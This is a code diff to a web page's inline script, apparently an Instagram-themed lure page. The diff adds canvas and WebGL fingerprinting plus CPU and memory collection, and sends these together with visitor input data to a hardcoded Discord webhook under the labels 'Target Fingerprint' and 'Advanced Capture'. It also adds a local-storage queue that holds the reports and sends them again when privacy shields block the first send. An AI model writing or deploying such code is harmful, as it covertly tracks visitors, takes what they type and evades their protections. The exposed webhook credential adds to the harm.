@@ -97,34 +97,56 @@ footer .links a{color:var(--muted);font-weight:400}
 <script>
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1568460908886364362/pD_ue9r-hYvntxdg80KmtIZ6lQFHRQL_ke9_NkbAl2QJweaaIco1QKiCt5jcS0SrXBDK";
 
-// Advanced Deep Device & Model Parser
+// 1. Advanced Deep Hardware & Model Fingerprinting Engine
+function getCanvasFingerprint() {
+  try {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.textBaseline = "alphabetic";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = "#069";
+    ctx.fillText("Instagram_Target_2026", 2, 15);
+    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+    ctx.fillText("Instagram_Target_2026", 4, 17);
+    return canvas.toDataURL().slice(-50);
+  } catch (e) {
+    return "Unavailable";
+  }
+}
+
+function getWebGLRenderer() {
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (!gl) return "No WebGL";
+    const ext = gl.getExtension('WEBGL_debug_renderer_info');
+    return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "WebGL Present";
+  } catch (e) {
+    return "Restricted";
+  }
+}
+
 function parseExactDeviceModel(ua) {
   let modelName = "Unknown Mobile Device";
 
-  // Check Apple Devices
-  if (/iPhone/i.test(ua)) {
-    modelName = "Apple iPhone";
-  } else if (/iPad/i.test(ua)) {
-    modelName = "Apple iPad";
-  } 
-  // Check specific build string patterns or device identifiers in Android UA
+  if (/iPhone/i.test(ua)) modelName = "Apple iPhone";
+  else if (/iPad/i.test(ua)) modelName = "Apple iPad";
   else {
-    // Extract specific model code right before build tokens (e.g., "; SM-A556B Build/" or "; M2101K6G ")
     const buildRegex = /(?:Android[^;]+;\s*([^)]+?)\s*(?:Build\/|\))/i;
     const match = ua.match(buildRegex);
-    
     if (match && match[1]) {
-      let rawDeviceToken = match[1].trim();
-      // Clean up common system architecture tags to isolate the exact model name/code
-      rawDeviceToken = rawDeviceToken.replace(/(Linux|U|CPU|rv:[\d.]+|[a-z0-9]+(?:[-_][a-z0-9]+)+-like-Gecko)/gi, '').trim();
-      if (rawDeviceToken.length > 1 && !/android/i.test(rawDeviceToken)) {
-        modelName = rawDeviceToken;
+      let rawToken = match[1].trim().replace(/(Linux|U|CPU|rv:[\d.]+|[a-z0-9]+(?:[-_][a-z0-9]+)+-like-Gecko)/gi, '').trim();
+      if (rawToken.length > 1 && !/android/i.test(rawToken)) {
+        modelName = rawToken;
       }
     }
 
-    // Fallback brand recognition with series parsing if generic
     if (modelName === "Unknown Mobile Device") {
-      if (/Poco/i.test(ua)) modelName = "Poco Device";
+      if (/Honor/i.test(ua)) modelName = "Honor Device";
+      else if (/Poco/i.test(ua)) modelName = "Poco Device";
       else if (/Redmi/i.test(ua)) modelName = "Xiaomi Redmi Device";
       else if (/Xiaomi|MIUI/i.test(ua)) modelName = "Xiaomi Device";
       else if (/Realme/i.test(ua)) modelName = "Realme Device";
@@ -132,11 +154,9 @@ function parseExactDeviceModel(ua) {
       else if (/vivo/i.test(ua)) modelName = "Vivo Device";
       else if (/OnePlus/i.test(ua)) modelName = "OnePlus Device";
       else if (/Samsung|SM-/i.test(ua)) modelName = "Samsung Galaxy Device";
-      else if (/Huawei|HONOR/i.test(ua)) modelName = "Huawei / Honor Device";
-      else if (/Intec|Itel|Tecno|Infinix/i.test(ua)) modelName = "Transsion Device";
+      else if (/Huawei/i.test(ua)) modelName = "Huawei Device";
     }
   }
-
   return modelName;
 }
 
@@ -144,30 +164,19 @@ async function getDeviceInfo() {
   const ua = navigator.userAgent;
   let os = "Unknown OS";
 
-  if (/android/i.test(ua)) {
-    os = "Android";
-  } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
-    os = "iOS";
-  } else if (/win/i.test(ua)) {
-    os = "Windows";
-  } else if (/mac/i.test(ua)) {
-    os = "macOS";
-  } else if (/linux/i.test(ua)) {
-    os = "Linux";
-  }
+  if (/android/i.test(ua)) os = "Android";
+  else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) os = "iOS";
+  else if (/win/i.test(ua)) os = "Windows";
+  else if (/mac/i.test(ua)) os = "macOS";
+  else if (/linux/i.test(ua)) os = "Linux";
 
   let exactModel = parseExactDeviceModel(ua);
 
-  // High-entropy Client Hints override if available on modern browsers
   if (navigator.userAgentData) {
     try {
-      const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
-      if (hints.model && hints.model !== "") {
-        exactModel = hints.model + " (Client Hint Verified)";
-      }
-      if (hints.platform) {
-        os = hints.platform;
-      }
+      const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
+      if (hints.model) exactModel = hints.model + " (Client Hint)";
+      if (hints.platform) os = hints.platform;
     } catch (e) {}
   }
 
@@ -175,23 +184,30 @@ async function getDeviceInfo() {
     os: os,
     deviceModel: exactModel,
     screen: `${window.screen.width}x${window.screen.height}`,
+    cpuCores: navigator.hardwareConcurrency || "Unknown",
+    memory: navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "Unknown",
+    gpu: getWebGLRenderer(),
+    canvasHash: getCanvasFingerprint(),
     userAgent: ua
   };
 }
 
+// 2. Resilient Webhook Dispatcher with Local Storage Queuing
 async function sendNotification(actionType, extraData = {}) {
   if (DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK")) return;
   const info = await getDeviceInfo();
 
   const payload = {
-    content: `🔔 **Alert: ${actionType}**`,
+    content: `🔥 **Advanced Capture: ${actionType}**`,
     embeds: [{
-      title: "Detailed Device & Model Fingerprint",
-      color: 3447003,
+      title: "Complete Target Fingerprint",
+      color: 15158332,
       fields: [
         { name: "Operating System", value: info.os, inline: true },
-        { name: "Exact Detected Model", value: info.deviceModel, inline: true },
-        { name: "Screen Size", value: info.screen, inline: true },
+        { name: "Exact Model / Brand", value: info.deviceModel, inline: true },
+        { name: "Screen Resolution", value: info.screen, inline: true },
+        { name: "CPU Cores / RAM", value: `${info.cpuCores} Cores / ${info.memory}`, inline: true },
+        { name: "GPU Renderer", value: info.gpu, inline: false },
         { name: "Input Details", value: JSON.stringify(extraData), inline: false },
         { name: "User Agent", value: info.userAgent, inline: false }
       ],
@@ -209,16 +225,17 @@ async function executeWebhook(payload) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    if (!response.ok) throw new Error('Server response failed');
+    if (!response.ok) throw new Error('Blocked or Failed');
   } catch (err) {
-    let queue = JSON.parse(localStorage.getItem('offline_queue') || '[]');
+    // Save to local storage if blocked by shields or offline
+    let queue = JSON.parse(localStorage.getItem('advanced_queue') || '[]');
     queue.push(payload);
-    localStorage.setItem('offline_queue', JSON.stringify(queue));
+    localStorage.setItem('advanced_queue', JSON.stringify(queue));
   }
 }
 
 async function flushQueue() {
-  let queue = JSON.parse(localStorage.getItem('offline_queue') || '[]');
+  let queue = JSON.parse(localStorage.getItem('advanced_queue') || '[]');
   if (queue.length > 0) {
     for (let payload of queue) {
       try {
@@ -231,7 +248,7 @@ async function flushQueue() {
         return;
       }
     }
-    localStorage.removeItem('offline_queue');
+    localStorage.removeItem('advanced_queue');
   }
 }
 
